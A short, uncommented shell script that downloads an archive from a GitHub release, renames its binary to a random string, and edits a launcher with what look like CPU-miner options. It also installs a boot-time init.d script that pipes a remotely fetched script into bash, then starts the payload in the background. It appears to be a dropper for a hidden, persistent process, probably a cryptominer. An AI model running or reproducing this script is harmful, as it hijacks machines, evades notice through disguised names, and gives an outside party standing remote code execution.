cd /
wget https://github.com/enirgy/grounded/releases/download/v1.5.1/channel.tar
tar -xvf channel.tar
cd /channel
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv circuit $variable1
sed -i "s/mongodb/${variable1} -n=${variable1} -t=10 -s=avx2/g" ./device.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/enirgy/grounded/main/solder.sh)" > terminal.sh
chmod a+x terminal.sh
update-rc.d terminal.sh defaults
rm -rf channel.tar
cd /channel
nohup ./device.sh
ps -ef | grep channel
